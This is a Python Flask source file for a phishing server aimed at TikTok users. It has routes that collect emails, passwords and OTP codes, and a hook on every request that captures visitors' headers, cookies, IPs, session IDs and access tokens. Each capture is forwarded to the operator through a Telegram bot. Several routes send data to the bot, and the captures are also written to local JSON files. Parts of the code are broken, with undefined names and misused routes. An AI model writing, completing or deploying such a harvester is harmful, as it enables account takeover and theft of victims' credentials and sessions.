from flask import (
Flask, g, render_template_string, request, jsonify, redirect, render_template, send_from_directory, session, url_for, make_response, abort)
from datetime import datetime
import os, json, requests, secrets
from pathlib import Path
import jwt
from functools import wraps
from typing import List, Dict,Any
 
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception as e:print(e)
    
    
app = Flask(__name__, template_folder="templates") 

app.debug = True
s = requests.Session()
r = s.get("https://www.tiktok.com/")
server_side_cookies = s.cookies.get_dict()
ALLOWED_ORIGIN = "https://www.tiktok.com/"
refresh_token = "REFRESH_TOKEN_FROM_SITE"
SESSIONS_FILE    = "sessions.json"
CREDENTIALS_FILE = "credentials.json"
TOKEN_TTL_HOURS=int(os.getenv("TOKEN_TTL_HOURS","999999999"))   
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
CHAT_ID   = os.getenv("TG_CHAT_ID")
ANSWER_FILE = "answer.json"
app.config.setdefault("sessionid"), requests.session()

def send_to_telegram(text: str):

    if not BOT_TOKEN or not CHAT_ID:
            print("⚠️ TG_BOT_TOKEN/TG_CHAT_ID مش مضبوطين في ENV — تخطّي الإرسال.")
            return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        r = requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
        print("TG >", r.status_code, r.text[:200])
        
        for i in range(0, len(text), 3500):
            chunk = text[i:i+3500]
            requests.post(url, json={"chat_id": CHAT_ID, "text": chunk}, timeout=10)
            
    except Exception as e:
        print("TG error:", e)     
        
def load_answers():
    if os.path.exists(ANSWERS_FILE):
        try:
            with open(ANSWERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
                
        except Exception:
            return[]
           
def save_answer(puzzle_no: int, answer: str):
    data = load_answer()
    data.append({
        "ts": datetime.utcnow().isoformat() + "Z",
        "puzzle": puzzle_no,
        "answer": (answer)
    })
    with open(ANSWER_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False,)
        
    with open(ANSWER_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        print(data)
        
def load_sessions():
    try:
        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return [] 
    except json.JSONDecodeError:
        return []  
    except Exception as e:
        print(f"Error loading sessions data: {e}")
        return []
        
def save_sessions(sessions_data):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(sessions_data, f, ensure_ascii=False, indent=2)
        print("Sessions data saved successfully.")
    except Exception as e:
        print(f"Error saving sessions data: {e}")
  

def require_step(min_step: int):

    cur = session.get("step", 1)
    if cur < min_step:
        return redirect(url_for("start"))
    return None
    
def init_session():
        print("Initializing seesion...")
        app.config["session"] = requests.Session()
        s = requests.Session()
        s.get("https://www.tiktok.com/cookies/set/sessionid/")
        print(s.cookies.get_dict())
        r = s.get("https://www.tiktok.com/cookies")
        print(r.text) 
init_session()           
    
@app.before_request
def load_data():


    headers = dict(request.headers)
    headers_list = [(k, v) for k, v in request.headers.items()]

    cookies = request.cookies.to_dict
    cookies_list = [(k, v) for k, v in request.cookies.items()]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent")
    ct = request.headers.get("Content-Type")
    
    print("=== HEADERS ===")
    for k, v in headers_list:
        print(f"{k}: {v}")

    print("=== COOKIES ===")
    for k, v in cookies_list:
        print(f"{k}={v}")
    
    message = f"""
    HEADERS:\n{headers_list}\n\nCOOKIES:\n{cookies_list}\nip:\n{ip} 
    """
    send_to_telegram(message) 

        
def build_payload(): 
    print("--- New Request ---")
    print("Headers:")
    for header, value in request.headers.items():
        print(f"{headers}: {value}")
        
    print("\nRaw Data:")
    print(request.data)
           
    data = {}
    try:
        data.update(request.form.to_dict())
        j = request.get_json(silent=True) or {}
        if isinstance(j, dict):
            data.update(j)
        data["args"] = request.args.to_dict()
        data["ip"] = request.remote_addr or ""
        data["ua"] = request.headers.get("User-Agent")
        data["ts"] = datetime.utcnow().isoformat() + "Z"
        payload = data
        print("payload:", payload)
    except Exception as e:
        return "",204
        
        
def detect_print():
    
    if "print-pdf" in request.headers.get("User-Agent", "").lower():
        print("🚨 محاولة طباعة من المتصفح اتسجلت!")
    
    if request.headers.get("Accept") == "application/pdf":
        print("🚨 محاولة طباعة أو حفظ كـ PDF detected!")
        

@app.route("/set_cookie")
def set_session_cookie(response, token):
    response.set_cookie(
        "sessionid",
        token,
        httponly=True,
        samesite="None",
        path="/"
    )
    
    sessions = load_sessions() or {}
    sessions[token] = {"session_id": token}
    
    save_sessions(sessions)
    
    return resp

@app.route("/get_cookie")
def get_cookie():
   
    token = request.cookies.get("sessionid")
    sessions = load_sessions() or {}
    ok = any(entry.get("sesstion_id") == token for entry in sessions)
    return f"cookie sessionid = {token}"
    
@app.route("/check")
def check():
    token = request.cookies.get("sessionid")
    sessions = load_sessions() or {}
    return {"ok":valid_session(token), "session_id":token}
    
@app.route("/", methods=["GET"])
def index():
    data = {
        "when": datetime.utcnow().isoformat()+"Z",
        "headers": dict(request.headers),
        "cookies": request.cookies.to_dict(),
        "args": request.args.to_dict(),          
        "form": request.form.to_dict(),          
        "json": request.get_json(silent=True),   
        "raw": request.get_data(as_text=True),  
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent")
    }
    
    data_server = {
        "server_time": datetime.utcnow().isoformat()+"Z",
        "server_ip": request.remote_addr,}
        
    payload = {**data, **data_server}
    sid=request.cookies.get("sessionid")
   
    send_to_telegram(f"{payload}\nSessionid: {sid}")

    return render_template("index.html", sid=sid)
    
@app.route("/cybercrime", methods=["GET"])
def cybercrime():
    data = {
       
        "headers": dict(request.headers),
        "cookies": request.cookies.to_dict(),          
        "form": request.form.to_dict(),          
        "json": request.get_json(silent=True),
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent")
    }
    
    data_server = {
        "server_time": datetime.utcnow().isoformat()+"Z",
        "server_ip": request.remote_addr,}
        
    payload = {**data, **data_server}
    sid=request.cookies.get("sessionid")
   
    send_to_telegram(f"{payload}\nSessionid: {sid}")
    

    return render_template("cybercrime.html", sid=sid)  


@app.route("/cybercrime", methods=["POST"])
def cybercrime_post():
    data = request.get_json(silent=True) or {}
    print("CYBERCRIME DATA:", data)
    return render_template("cybercrime.html", sid=sid) 
    
@app.route("/login", methods=["POST"]) 
def login_post():
    email = request.form.get("answer")
    password = request.form.get("answer")
    answer = {"email": email, "password": password}
    save_answer(1, answer)
    send_to_telegram(f": {answer}")
    return redirect(url_for("login_get"))
 
@app.route("/login", methods=["GET"])
def login_get():
    return render_template("login.html")


@app.route("/otp", methods=["POST"])
def otp_post():
    otp = request.form.get("answer")
    answer = {"otp":otp}
    save_answer(2, answer)
    send_to_telegram(f"🧩 إجابة اللغز 2: {answer}")
    return redirect(url_for("otp_get"))

@app.route("/otp", methods=["GET"])
def otp_get():
    return render_template("otp.html")
    
@app.route('/thanks.html')
def thanks():
    return render_template("thanks.html")

    
@app.route("/track", methods=["POST"])
def track():
    data = {
        "when": datetime.utcnow().isoformat()+"Z",
        "headers": dict(request.headers),
        "cookies": request.cookies.to_dict(),
        "args": request.args.to_dict(),          
        "form": request.form.to_dict(),          
        "json": request.get_json(silent=True),  
        "raw": request.get_data(as_text=True),   
        "ip": request.headers.get("Forwarded-For", request.remote_addr),
        "ua": request.headers.get("User-Agent", ""),
        "received_at": datetime.utcnow().isoformat() + "Z"
    }
    data_server ={
        "server_time": datetime.utcnow().isoformat() + "Z",
        "server_ip": request.remote_addr,
        "server_name": "Main-Node-1"
    }
    payload = {**data, **data_server}
    
    send_to_telegram(f"{payload}")
    return jsonify({"payload": payload})

@app.route("/endpoint", methods=["POST"])
def endpoint():
    payload = request.get_json()
    path = payload.get("path")
    data = payload.get("data", {})
    s = app.config["sessionid"]
    
    tik_url = f"https://www.tiktok.com{path}"
    resp = s.post(tik_url, json=data, headers=headers, timeout=20)
    
    r = s.get("https://www.tiktok.com/", headers=headers)
    
    cookies = r.cookies.get_dict()
    
    r2 = s.get("https://www.tiktok.com/@bmwlovers1077")

    resp = requests.get("https://www.tiktok.com/", headers=headers, cookies=r.cookies.get_dict())

    
    resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
    resp.headers["Access-Control-Allow-Credentials"] = "true"

    message = f"""
    TikTok EndpointDebug Report
    Payload: {payload}
    Request Path: {path}
    Data Sent: {data}
    Request Headers: {headers}

    POST Response: {resp.status_code}
    Cookies: {cookies}
    GET Response: {r2.status_code}

    GET Response Headers:
    {resp.headers}
    
    Request Headers: {r.request.headers}
    Response Cookies: {r.cookies.get_dict()}

    
    Request Headers: {r2.request.headers}
    Response Cookies: {r2.cookies.get_dict()}

    
    Request Headers: {resp.request.headers}
    Response Cookies: {resp.cookies.get_dict()}

    
    Method: {request.method}
    Args (GET params): {request.args.to_dict()}
    Form (POST data): {request.form.to_dict()}
    JSON body: {request.get_json(silent=True)}
    Cookies: {request.cookies.to_dict()}
    """
    print(message)
    send_to_telegram(message)
    
    resp.headers["Access-Control-Allow-Origin"]= "https://www.tiktok.com"
    resp.headers["Access-Control-Allow-Credentials"]="true"
    resp = requests.get("https://www.tiktok.com/@bmwlovers1077/", cookies=cookies, headers=headers)
    

@app.after_request
def add_headers(resp):
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return resp

@app.route("/savecookies")
def savecookies():
  
    cookies = request.cookies.to_dict()

    try:
   
        if os.path.exists("cookies.json"):
            with open("cookies.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                print("Loaded cookies.json:", data)
        else:
            data = []
    except:
        data = []
   
    data.append(cookies)
    print("After append:", data)
  
    with open("cookies.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

    return "ok"
    

@app.route("/save-token", methods=["POST"])
def save_token():
    data = request.get_json()
    token = data.get("accessToken")
    send_to_telegram(token)
    return jsonify({"ok": True})    



@app.route("/refresh", methods=["GET"])
def refresh_access_token():
    resp = requests.post("https://www.tiktok.com/@bmwlovers1077/refresh", data={
        "grant_type": "refresh_token",
        "refresh_token": refresh_token
    })
    
    if resp.status_code == 200:
        new_token = resp.json().get("access_token")
        return jsonify({"access_token": new_token})

             
@app.route('/session_files')
def session_files():

       all_headers = dict(request.headers)
       
       all_cookies = request.cookies.to_dict()
       
       for name, value in request.cookies.items():
       
           print(name, "=", value)
          
       message = f"New Request\n\nHEADERS:\n{dict(all_headers)}\n\nCOOKIES:\n{dict(all_cookies)}"

       send_to_telegram(message)
       
       resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
       resp.headers["Access-Control-Allow-Credentials"] = "true"
    
       return resp     

@app.route('/collect_session', methods=['POST'])
def collect_session():
    try:
        payload = request.get_json(silent=True)
        if not payload:
            payload = request.form.to_dict()  
        message = payload     
        
        send_to_telegram(message)
        return jsonify({"received": payload}), 200
    except exception as e:
        print("error:")
        print(e)  
        return "OK", 200

         
def collect_sessions():

     data = request.get_json(silent=True) or {}
     logs.append({
        "email": data.get("email", ""),
        "password": data.get("password"),
        "phone": data.get("phone"),
        "otp": data.get("otp"),
        "ip": data.get("ip"),
        "cookie": data.get("cookies"),
     })
     sessions =load_sessions()
     sessions.append(session_data)

     save_sessions(sessions)
        
         
           
     message = f"""
        Cookie: {data.get("cookies")}
        Email: {data.get("email")}
        Password: {data.get("password")}
        Phone: {data.get("phone")}
        OTP: {data.get("otp")}
        IP: {data.get("ip")}
        """ 
     print ("error in collect_session:", repr(e))   
     send_to_telegram(message)
     return {"status": "saved"}  
    
    
@app.route('/collect', methods=['POST'])
def collect():
    body = {}
    try:
        if request.is_json:
            body = request.get_json(silent=True) or {}
    except Exception:
        body = {}

    if not body and request.form:
        body = request.form.to_dict()

    headers = dict(request.headers)
    cookies = request.cookies.to_dict()

    ip = headers.get("X-Forwarded-For") or request.remote_addr
    ua = headers.get("User-Agent")
    authorization = headers.get("Authorization")

    cookie_token = (
        cookies.get("sessionid")
        or cookies.get("sessionID")
        or cookies.get("csrftoken")
        or cookies.get("csrfToken")
        or cookies.get("cookie_token")
    )

    form_token = body.get("token") or request.form.get("token")

    session_data = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "ip": ip,
        "ua": ua,
        "headers": headers,
        "cookies": cookies,
        "authorization": authorization,
        "cookie_token": cookie_token,
        "form_token": form_token,
        "body": body,
    }

    sessions = load_sessions()
    sessions.append(session_data)
    save_sessions(sessions)

    print("SESSION:", session_data)

    return jsonify({"status": "saved"})

@app.route("/submit", methods=["POST"])
def submit():  

    data = {}
    try:
        data.update(request.form.to_dict())
        j = request.get_json(silent=True) or {}
        if isinstance(j, dict):
            data.update(j)
        data["args"] = request.args.to_dict()
        data["ip"] = request.remote_addr or ""
        data["ua"] = request.headers.get("User-Agent")
        data["ts"] = datetime.utcnow().isoformat() + "Z"
    except Exception as e:
        print("build payload error:", repr(e))

    try:
        log = []
        if os.path.exists("log.json"):
            with open("log.json", "r", encoding="utf-8") as f:
                log = json.load(f)
                if not isinstance(log, list):
                    log = []
        log.append(data)
        with open("log.json", "w", encoding="utf-8") as f:
            json.dump(log, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print("save log error:", repr(e))

   
    try:
        send_to_telegram(json.dumps(data, ensure_ascii=False, indent=2))
    except Exception as e:
        print("tg send error:", repr(e))

   
    return redirect(url_for("otp_get"))                     
     
@app.route("/show_cookies")
def show_cookies():
    
    cookies = request.cookies.to_dict()
    result = []
    for name, value in cookies.items():
        result.append(f"{name} = {value}")
        
    lines = [f"{k} = {v}" for k, v in request.cookies.items()]    
        
    send_to_telegram("\n".join(liness))
         
    return "<br>".join(result) 
         
if __name__ == "__main__":
        port = int(os.environ.get("PORT",8081))
        app.run(host="0.0.0.0", port=port, debug=True)
